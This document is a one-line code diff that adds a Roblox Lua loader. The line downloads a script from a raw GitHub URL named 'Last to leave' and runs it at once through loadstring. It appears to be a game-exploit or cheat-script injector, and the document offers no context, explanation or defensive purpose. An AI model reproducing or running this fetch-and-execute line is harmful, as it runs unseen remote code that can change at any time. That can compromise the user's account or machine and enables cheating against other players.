@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/danielontopp/huge/main/Last%20to%20leave",true))()
